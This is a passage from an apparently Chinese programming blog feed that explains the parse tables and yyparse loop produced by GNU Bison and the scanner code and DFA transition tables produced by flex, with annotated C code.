class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>例如<strong>rule2</strong>的<code>S: &#39;\n&#39;</code>右侧有1个symbol，因此yyr2[2]=1。在归约的时候，通过这个表中查找在对应的rule下，我们要从栈中pop出多少state来作为归约。</p><h4 id="yytable"><a href="#yytable" class="headerlink" title="yytable"></a>yytable</h4><p>yytable和yycheck, yypact, yypgoto 配合来表示当前的状态是应该放入移入中还是符合rule来进行归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTABLE[YYPACT[STATE-NUM]].  What to do in state STATE-NUM.  If</span></span><br><span class="line"><span class="comment">   positive, shift that token.  If negative, reduce the rule which</span></span><br><span class="line"><span class="comment">   number is the opposite.  If zero, do what YYDEFACT says.</span></span><br><span class="line"><span class="comment">   If YYTABLE_NINF, syntax error.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYTABLE_NINF -1</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytable[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">1</span>,     <span class="number">3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正数表示移入，负数表示归约，其中归约所使用的规则的number为元素的绝对值，即如果是-3，则使用rule3来进行归约。</p><h4 id="yypgoto"><a href="#yypgoto" class="headerlink" title="yypgoto"></a>yypgoto</h4><p>因为同一个非终结符，根据之前状态的不同，其跳转的状态也是不同的，那么对于存在不同情况的GOTO情况，则由yypgoto记录。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYPGOTO[NTERM-NUM].  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-4</span>,     <span class="number">-4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此表的索引对应这所有的非终结符，这里分别对应<code>$accept</code>,<code>S</code>。</p><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引，去yytable找到新的状态值，即此时状态索引为0 (4-4)， 那么yytable[0]为1，那么现在的状态就是1，被压入状态栈顶。</p><p>parser到底是用<code>yypgoto</code>还是<code>yydefgoto</code>来设置接下来的状态，将在<code>yycheck</code>中指出。</p><h4 id="yypact"><a href="#yypact" class="headerlink" title="yypact"></a>yypact</h4><p>yypact定义了在初始状态下的部分yytable。它由token标号来索引。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYPACT_NINF -4</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypact[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-3</span>,    <span class="number">-4</span>,    <span class="number">1</span>,     <span class="number">-4</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是解析循环查询的第一个表，在parse循环开始的时候，如果yypact[cur-state] = YYPACT_NINF，意味着使用yydefact来进行归约，并且只有归约没有移入操作。</p><p>例如此处如果是状态1和3，则为YYPACT_NINF，只进行归约操作。</p><p>如果现在在状态0，展望符为<code>\n</code>(即3号symbol,由yytranslate可得)，那么现在的yypact[0]为-3，所以在yytable中的索引应该为<code>-3+3=0</code>, yytable[0]为1，表示移入并转移到状态1。</p><h4 id="yycheck"><a href="#yycheck" class="headerlink" title="yycheck"></a>yycheck</h4><p>yycheck主要有两个作用，一个是判断归约还是移入，一个是判断选用<code>yypgoto</code>还是<code>yydefgoto</code>跳转表。</p><h5 id="yytable-or-yydefact"><a href="#yytable-or-yydefact" class="headerlink" title="yytable or yydefact"></a>yytable or yydefact</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">YYCHECK = a <span class="built_in">vector</span> indexed in parallel with YYTABLE.  It indicates,</span><br><span class="line">   in a roundabout way, the bounds of the portion you are trying to</span><br><span class="line">   examine.</span><br><span class="line"></span><br><span class="line">   Suppose that the portion of YYTABLE starts at index P <span class="keyword">and</span> the index</span><br><span class="line">   to be examined within the portion is I.  Then <span class="keyword">if</span> YYCHECK[P+I] != I,</span><br><span class="line">   I is outside the bounds of what is actually allocated, <span class="keyword">and</span> the</span><br><span class="line">   <span class="keyword">default</span> (from YYDEFACT <span class="keyword">or</span> YYDEFGOTO) should be used.  Otherwise,</span><br><span class="line">   YYTABLE[P+I] should be used.  </span><br></pre></td></tr></table></figure><p>parse会判断yycheck[0]是否为所有有效token的symbol number, 如果不是，则进行yydefault的归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn += yytoken;</span><br><span class="line">  <span class="keyword">if</span> (yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn || yycheck[yyn] != yytoken)</span><br><span class="line">    <span class="keyword">goto</span> yydefault;</span><br></pre></td></tr></table></figure><p>此时yycheck[0]=3，而<code>\n</code>正好是3号symbol，所有我们选择<code>yytable</code>。</p><h5 id="yydefgoto-or-yypgoto"><a href="#yydefgoto-or-yypgoto" class="headerlink" title="yydefgoto or yypgoto"></a>yydefgoto or yypgoto</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn = yyr1[yyn];</span><br><span class="line">yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] == *yyssp)</span><br><span class="line">    yystate = yytable[yystate];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    yystate = yydefgoto[yyn - YYNTOKENS];</span><br></pre></td></tr></table></figure><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引4-4=0，查询yycheck，如果为4，则表示状态4为特殊状态，选择yytable; 否则就用yydefgoto表来决定跳转。</p><h3 id="parse分析"><a href="#parse分析" class="headerlink" title="parse分析"></a>parse分析</h3><p>详见注释</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此变量存储展望符.  */</span></span><br><span class="line"><span class="keyword">int</span> yychar;</span><br><span class="line"><span class="comment">/* 展望符的语义值.  */</span></span><br><span class="line">YYSTYPE yylval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">yyparse()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> yystate; <span class="comment">/* current state */</span></span><br><span class="line"><span class="keyword">int</span> yyn;<span class="comment">/* 这是一个通用变量！一次可能代表一种状态，下次可能代表一条规则 */</span></span><br><span class="line"><span class="keyword">int</span> yyresult;<span class="comment">/* 解析结果返回给调用者 */</span></span><br><span class="line"><span class="keyword">int</span> yytoken=<span class="number">0</span>;<span class="comment">/* current token */</span></span><br><span class="line"><span class="comment">/* The state stack: This parser does not shift symbols on to the stack. Only a stack of states is maintained. */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> yyssa[YYINITDEPTH];<span class="comment">/*YYINITDEPTH is 200 */</span></span><br><span class="line"> <span class="keyword">int</span> *yyss = yyssa<span class="comment">/* Bottom of state stack */</span></span><br><span class="line"> <span class="keyword">int</span> *yyssp;<span class="comment">/* Top of state stack */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The semantic value stack: 该栈与状态栈平行增长。每次减少时，都会从堆栈中弹出语义值，并执行语义操作 */</span></span><br><span class="line">  YYSTYPE yyvsa[YYINITDEPTH];</span><br><span class="line">  YYSTYPE *yyvs = yyvsa;<span class="comment">/* Bottom of semantic stack */</span></span><br><span class="line">  YYSTYPE *yyvsp;<span class="comment">/* Top of semantic stack */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POP the state and semantic stacks by N symbols - useful for reduce actions */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> YYPOPSTACK(N)   (yyvsp -= (N), yyssp -= (N))</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> yylen = <span class="number">0</span>;<span class="comment">/* 该变量用于归约操作中保存规则右侧的终结符长度 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok done declaring variables. Set the ball rolling */</span></span><br><span class="line">  </span><br><span class="line">  yystate = <span class="number">0</span>;<span class="comment">/* Initial state */</span></span><br><span class="line">  yychar = YYEMPTY <span class="comment">/* YYEMPTY is -2 */</span></span><br><span class="line">  </span><br><span class="line">  yyssp = yyss; <span class="comment">/* Top = bottom for state stack */</span></span><br><span class="line">  yyvsp = yyvs;<span class="comment">/* Same for semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yysetstate; <span class="comment">/* Well, gotos are used for extracting maximum performance. */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Each label can be thought of as a function */</span></span><br><span class="line">  </span><br><span class="line">  yynewstate:  <span class="comment">/* Push a new state on the stack */</span></span><br><span class="line">  </span><br><span class="line">  yyssp ++;<span class="comment">/*Just increment the stack top; actual &#x27;pushing&#x27; will happen in yysetstate */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yysetstate:</span><br><span class="line">  </span><br><span class="line">  *yyssp = yystate;<span class="comment">/* Ok pushed state on state stack top */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yybackup;<span class="comment">/* This is where you will find some action */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yybackup:<span class="comment">/* The main parsing code starts here */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yypact[yystate];<span class="comment">/* Refer to what yypact is saying about the current state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == YYPACT_NINF) <span class="comment">/* If negative infinity its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yydefault;<span class="comment">/* This label implements default reductions; see below */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Check if we have a look-ahead token ready. This is LALR(1) parsing */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar == YYEMPTY)</span><br><span class="line">  </span><br><span class="line">  yychar = YYLEX; <span class="comment">/* Macro YYLEX is defined as yylex() */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar &lt;= YYEOF) <span class="comment">/* YYEOF is 0 - the token returned by lexer at end of input */</span></span><br><span class="line">  </span><br><span class="line">  yychar = yytoken = YYEOF; <span class="comment">/* set all to EOF */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  </span><br><span class="line">  yytoken = yytranslate[yychar];<span class="comment">/* Translate the lexer token into internal symbol number */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Now we have a look-ahead token. Let the party begin ! */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyn = yyn + yytoken;<span class="comment">/* This is yypact[yystate] + yytoken */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Observe this check carefully. We are checking that yyn is within the bounds of yytable</span></span><br><span class="line"><span class="comment">   * and also if yycheck contains the current token number.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> ( yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn  || yycheck[yyn] != yytoken )<span class="comment">/* YYLAST is the highest index in yytable */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">goto</span> yydefault; <span class="comment">/* Its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok, yyn is within bounds of yytable */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yytable[yyn];<span class="comment">/* This is yytable[ yypact[yystate] + yytoken ] */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yyn &lt;= <span class="number">0</span>)<span class="comment">/* If yytable happens to contain a -ve value, its not a shift - its a reduce */</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (yyn == <span class="number">0</span> || yyn == YYTABLE_NINF)<span class="comment">/* But check for out of bounds condition*/</span></span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;<span class="comment">/* Label to handle errors */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Other wise reduce with rule # -yyn */</span></span><br><span class="line">  </span><br><span class="line">  yyn = -yyn;</span><br><span class="line">  <span class="keyword">goto</span> yyreduce; <span class="comment">/* Label to implement reductions */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Last check: See if we reached final state! */</span></span><br><span class="line">  <span class="keyword">if</span> (yyn == YYFINAL)<span class="comment">/* YYFINAL is 8 in our case */</span></span><br><span class="line">  YYACCEPT;<span class="comment">/* macro deined as &#x27;goto acceptlab - a label to finish up */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* That completes all checks; If we reached here, there is no other option but to shift */</span></span><br><span class="line">  </span><br><span class="line">  yystate = yyn;<span class="comment">/* Now, yyn (= yytable[ yypact[yystate] + yytoken ]) is a state that has to be pushed */</span></span><br><span class="line">  </span><br><span class="line">  *++yyvsp = yylval; <span class="comment">/* Push the semantic value of the symbol on the semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yynewstate;<span class="comment">/* This will increment state stack top and the following yysetstate that will do the pushing */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yydefault:<span class="comment">/* A label to implement default reductions */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yydefact[yystate];<span class="comment">/* Get the default reduction rule for this state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == <span class="number">0</span> )<span class="comment">/* This state has no default reduction. Something is wrong */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyreduce;<span class="comment">/* Ok, got the default reduction rule # in yyn; go ahead and reduce the stack */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyreduce:<span class="comment">/* A lablel that implements reductions on stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* By the time we are here, yyn contains the rule# to use for reducing the stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Steps for reduction:</span></span><br><span class="line"><span class="comment">   * 1. Find the length of RHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 2. Execute any semantic actions by taking the values from the semantic stack</span></span><br><span class="line"><span class="comment">   * 3. POP &#x27;length&#x27; symbols from the state stack and &#x27;length&#x27; values from semantic stack</span></span><br><span class="line"><span class="comment">   * 4. Find the LHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 5. Find the GOTO of state currently on top of stack on LHS symbol</span></span><br><span class="line"><span class="comment">   * 6. Push that state on top of stack</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   </span><br><span class="line">   yylen = yyr2[yyn];<span class="comment">/* Get length of RHS */</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Default semantic action - $$=$1 */</span></span><br><span class="line">   yyval = yyvsp[<span class="number">1</span>-yylen];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Execute semantic actions */</span></span><br><span class="line">   <span class="keyword">switch</span> ( yyn )<span class="comment">/* Each rule has its own semantic action */</span></span><br><span class="line">   &#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">default</span>:<span class="keyword">break</span>;<span class="comment">/* We didn&#x27;t have any semantic actions in the grammar.*/</span></span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   YYPOPSTACK (yylen);<span class="comment">/* This will pop both state and semantic stacks. See definition of this macro above */</span></span><br><span class="line">   </span><br><span class="line">   yylen = <span class="number">0</span>;<span class="comment">/* re-initialize yylen */</span></span><br><span class="line">   </span><br><span class="line">   *++yyvsp  = yyval;<span class="comment">/* Push the result of semantic evaluation on top of semantic stack */</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Now shift the result of reduction (steps 4 - 6) */</span></span><br><span class="line">   </span><br><span class="line">   yyn = yyr1[yyn];<span class="comment">/* Reuse yyn at every opportunity.  For now, yyn is the LHS symbol (number) of the rule */</span></span><br><span class="line">   </span><br><span class="line"> <span class="comment">/* First check for anomalous GOTOs, otherwise use Default GOTO (YYDEFGOTO)</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Observe that if we subtract no. of terminals (YYNTOKENS) from symbol number of a nonterminal, we get</span></span><br><span class="line"><span class="comment">  * an index into yypgoto or yydefgoto for that non-terminal.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  </span><br><span class="line">   yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* A couple of checks are needed before we know this is not a default GOTO</span></span><br><span class="line"><span class="comment">    * 1. yystate must be within bounds of yytable. ( 0 to YYLAST )</span></span><br><span class="line"><span class="comment">    * 2. yycheck must contain the state currently on top of the stack</span></span><br><span class="line"><span class="comment">    */</span>   </span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] = *yyssp)</span><br><span class="line">   </span><br><span class="line">   yystate = yytable[yystate];<span class="comment">/* Take the GOTO from yytable */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   </span><br><span class="line">   yystate = yydefgoto[yyn - YYNTOKENS];<span class="comment">/* Otherwise use the default GOTO */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">goto</span> yynewstate;<span class="comment">/* Simply push the newly found state on top of stack and continue */</span></span><br><span class="line">   </span><br><span class="line">&#125;<span class="comment">/* End of yyparse() */</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说和flex类似，其实也是通过一系列的表来驱动。</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser">https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/01/22/Understanding%20C%20parsers%20generated%20by%20GNU%20Bison/#disqus_thread</comments>
    </item>
    
    <item>
      <title>lexical scanner generated by flex</title>
      <link>https://billyotry.github.io/2021/01/22/lexical%20scanner%20generated%20by%20flex/</link>
      <guid>https://billyotry.github.io/2021/01/22/lexical%20scanner%20generated%20by%20flex/</guid>
      <pubDate>Thu, 21 Jan 2021 16:59:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h2 id=&quot;flex生成代码分析&quot;&gt;&lt;a href=&quot;#flex生成代码分析&quot; class=&quot;headerlink&quot; title=&quot;flex生成代码分析&quot;&gt;&lt;/a&gt;flex生成代码分析&lt;/h2&gt;&lt;p&gt;本文从flex源码入手分析flex框架。&lt;/p&gt;
&lt;p&gt;flex会根据我们所
        
      
      </description>
      
      
      <content:encoded><![CDATA[<h2 id="flex生成代码分析"><a href="#flex生成代码分析" class="headerlink" title="flex生成代码分析"></a>flex生成代码分析</h2><p>本文从flex源码入手分析flex框架。</p><p>flex会根据我们所定义的正则表达式来匹配相应的字符，然后执行相应的函数操作来输出相应的 token。</p><p>新建空规则 <code>null.flex</code> 来了解 flex 是如何工作的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%%</span><br></pre></td></tr></table></figure><p>运行命令 <code>flex null.flex</code> 生成代码如下：<a href="https://pastebin.com/LBEXsnZK">https://pastebin.com/LBEXsnZK</a></p><p>首先定义与 flex 版本相关的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define FLEX_SCANNER</span><br><span class="line">#define YY_FLEX_MAJOR_VERSION 2</span><br><span class="line">#define YY_FLEX_MINOR_VERSION 6</span><br><span class="line">#define YY_FLEX_SUBMINOR_VERSION 0</span><br><span class="line">#if YY_FLEX_SUBMINOR_VERSION &gt; 0</span><br><span class="line">#define FLEX_BETA</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>为了防止类型被用户代码冲突，此处将一些类型 define 成的自己的格式，或许是出于可移植性以及用户可定制性的考虑，flex 将大量关键字 define/typedef 成了自己的特殊关键字，不过从名称上大体都能猜出是什么含义。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">typedef int8_t flex_int8_t;</span><br><span class="line">typedef uint8_t flex_uint8_t;</span><br><span class="line">typedef int16_t flex_int16_t;</span><br><span class="line">typedef uint16_t flex_uint16_t;</span><br><span class="line">typedef int32_t flex_int32_t;</span><br><span class="line">typedef uint32_t flex_uint32_t;</span><br><span class="line">#else</span><br><span class="line">typedef signed char flex_int8_t;</span><br><span class="line">typedef short int flex_int16_t;</span><br><span class="line">typedef int flex_int32_t;</span><br><span class="line">typedef unsigned char flex_uint8_t; </span><br><span class="line">typedef unsigned short int flex_uint16_t;</span><br><span class="line">typedef unsigned int flex_uint32_t;</span><br></pre></td></tr></table></figure><p>然后是定义 EOF 的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_NULL 0</span><br></pre></td></tr></table></figure><p>将字符转为对应的 ascii 码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_SC_TO_UI(c) ((unsigned int) (unsigned char) c)</span><br></pre></td></tr></table></figure><p>虽然 DFA 在状态转移的过程中一次前进一个字符，但是为了提高 IO 效率，实际从文件读取的时候一般是批量往缓冲区读入的。如果有需要微调这个读入策略的需求，可以通过定义 <code>YY_INPUT</code> 宏来实现。在默认生成的代码中，这个宏被定义为一段比较复杂的C代码。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line"><span class="keyword">if</span> ( YY_CURRENT_BUFFER_LVALUE-&gt;yy_is_interactive ) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> c = <span class="string">&#x27;*&#x27;</span>; </span><br><span class="line"><span class="keyword">size_t</span> n; </span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; max_size &amp;&amp; </span><br><span class="line">     (c = getc( yyin )) != EOF &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>; ++n ) </span><br><span class="line">buf[n] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == <span class="string">&#x27;\n&#x27;</span> ) </span><br><span class="line">buf[n++] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == EOF &amp;&amp; ferror( yyin ) ) </span><br><span class="line">YY_FATAL_ERROR( <span class="string">&quot;input in flex scanner failed&quot;</span> ); </span><br><span class="line">result = n; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span> ( (result = fread(buf, <span class="number">1</span>, max_size, yyin))==<span class="number">0</span> &amp;&amp; ferror(yyin)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>( errno != EINTR) </span><br><span class="line">&#123; </span><br><span class="line">YY_FATAL_ERROR( <span class="string">&quot;input in flex scanner failed&quot;</span> ); </span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line">clearerr(yyin); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上述 C 代码十分复杂，我们也可以将此宏修改成如下形式</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line">    <span class="keyword">if</span> ( (result = fread( (<span class="keyword">char</span>*)buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), max_size, fin)) &lt; <span class="number">0</span>) </span><br><span class="line">        YY_FATAL_ERROR( <span class="string">&quot;read() in flex scanner failed&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="DFA状态转移表分析"><a href="#DFA状态转移表分析" class="headerlink" title="DFA状态转移表分析"></a>DFA状态转移表分析</h2><h3 id="未压缩状态矩阵"><a href="#未压缩状态矩阵" class="headerlink" title="未压缩状态矩阵"></a>未压缩状态矩阵</h3><p>以下是<strong>经过压缩</strong>的状态转移矩阵.其实 flex 在默认的情况下,会输出压缩版本的状态转移矩阵,因为完整版本的矩阵是 Nx128 大小(其中N是自动机的状态数，128 则是字符集大小如果不经压缩的话,会带来不必要的空间开销。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_accept[6]</span><br><span class="line">static yyconst YY_CHAR yy_ec[256]</span><br><span class="line">static yyconst YY_CHAR yy_meta[2]</span><br><span class="line">static yyconst flex_uint16_t yy_base[7]</span><br><span class="line">static yyconst flex_int16_t yy_def[7]</span><br><span class="line">static yyconst flex_uint16_t yy_nxt[5]</span><br><span class="line">static yyconst flex_int16_t yy_chk[5]</span><br></pre></td></tr></table></figure><p>以下是未经过压缩的状态转移矩阵。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_nxt[][128] &#x3D; &#123;...&#125;</span><br><span class="line">static yyconst flex_int16_t yy_accept[..] &#x3D; &#123;...&#125;</span><br></pre></td></tr></table></figure><ul><li>yy_accept 是 accept 的状态</li><li>yy_nxt 是状态跳转表</li></ul><p>有了状态转移表，接下来的关键问题就是如何使用它。这里我们就要参考词法分析函数的实现函数—— <code>yylex()</code>的具体实现了。</p><p>在 flex 所生成的代码中，连这个函数的定义语句都被define成<code>YY_DECL</code>：<code>#define YY_DECL int yylex (void)</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** The main scanner function which does all the work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">YY_DECL</span><br><span class="line">&#123;</span><br><span class="line">    yy_state_type yy_current_state;</span><br><span class="line">    <span class="keyword">char</span> *yy_cp, *yy_bp;</span><br><span class="line">    <span class="keyword">int</span> yy_act;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( !(yy_init) )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_init) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! (yy_start) )</span><br><span class="line">            (yy_start) = <span class="number">1</span>; <span class="comment">// 初始状态定义</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 设置文件输入、输出指针 */</span></span><br><span class="line">        <span class="keyword">if</span> ( ! yyin )</span><br><span class="line">            yyin = <span class="built_in">stdin</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! yyout )</span><br><span class="line">            yyout = <span class="built_in">stdout</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 对非owner的buffer使用stack方式管理*/</span></span><br><span class="line">        <span class="keyword">if</span> ( ! YY_CURRENT_BUFFER ) &#123;</span><br><span class="line">            yyensure_buffer_stack ();</span><br><span class="line">            YY_CURRENT_BUFFER_LVALUE =</span><br><span class="line">                yy_create_buffer(yyin,YY_BUF_SIZE );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        yy_load_buffer_state( );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )        </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 设置各种buffer处的指针，以便在匹配成功时，通过yytext获取对应字符串</span></span><br><span class="line">        <span class="comment">/*此指针指向上一字符*/</span></span><br><span class="line">        yy_cp = (yy_c_buf_p);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Support of yytext. */</span></span><br><span class="line">        <span class="comment">/*此指针不断指向要读入的字符,将会在状态跳转中不断更新*/</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* yy_bp points to the position in yy_ch_buf of the start of</span></span><br><span class="line"><span class="comment">         * the current run.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        yy_bp = yy_cp;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 默认从start状态开始</span></span><br><span class="line">        yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line">        <span class="comment">// 开始进行状态转移, 通过yy_nxt表，结合yy_current_state和当前读入的字符来索引跳转状态, 直到无法转移</span></span><br><span class="line">        <span class="comment">// 根据当前状态，以及下一个字符，来进行转移</span></span><br><span class="line">        <span class="keyword">while</span> ( (yy_current_state = yy_nxt[yy_current_state][ YY_SC_TO_UI(*yy_cp) ]) &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">if</span> ( yy_accept[yy_current_state] )</span><br><span class="line">                